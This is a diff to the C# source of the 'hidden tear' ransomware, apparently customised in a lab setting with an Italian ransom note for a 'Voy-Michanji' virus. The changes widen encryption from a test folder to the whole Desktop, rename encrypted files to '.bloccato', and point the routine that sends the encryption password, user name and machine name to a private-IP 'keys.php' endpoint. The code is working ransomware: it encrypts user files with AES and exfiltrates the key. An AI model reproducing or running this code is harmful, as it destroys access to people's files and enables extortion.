@@ -46,7 +46,7 @@ namespace hidden_tear
     public partial class Form1 : Form
     {
         //Url to send encryption password and computer info
-        string targetURL = "https://www.example.com/hidden-tear/write.php?info=";
+        string targetURL = "http://192.168.17.128/keys.php?info=";
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
@@ -77,7 +77,7 @@ namespace hidden_tear
         public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
         {
             byte[] encryptedBytes = null;
-            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8};
             using (MemoryStream ms = new MemoryStream())
             {
                 using (RijndaelManaged AES = new RijndaelManaged())
@@ -88,6 +88,9 @@ namespace hidden_tear
                     var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                     AES.Key = key.GetBytes(AES.KeySize / 8);
                     AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                    //Proviamo con padding
+                    AES.Padding = PaddingMode.Zeros;
 
                     AES.Mode = CipherMode.CBC;
 
@@ -136,7 +139,7 @@ namespace hidden_tear
             byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
 
             File.WriteAllBytes(file, bytesEncrypted);
-            System.IO.File.Move(file, file+".locked");
+            System.IO.File.Move(file, file+".bloccato");
 
             
             
@@ -172,7 +175,7 @@ namespace hidden_tear
         public void startAction()
         {
             string password = CreatePassword(15);
-            string path = "\\Desktop\\test";
+            string path = "\\Desktop";
             string startPath = userDir + userName + path;
             SendPassword(password);
             encryptDirectory(startPath,password);
@@ -183,9 +186,9 @@ namespace hidden_tear
 
         public void messageCreator()
         {
-            string path = "\\Desktop\\test\\READ_IT.txt";
+            string path = "\\Desktop\\LEGGI_QUI.txt";
             string fullpath = userDir + userName + path;
-            string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
+            string[] lines = { "Abbiamo cifrato i file sul tuo desktop con il virus Voy-Michanji", "Ti conviene mandarmi al più presto 50 BTH o 5 Kg di melanzane sott'olio", "Tra un paio di giorni ti dirò l'indirizzo a cui spedirle. Nel frattempo BUON DIVERTIMENTO!" };
             System.IO.File.WriteAllLines(fullpath, lines);
         }
     }
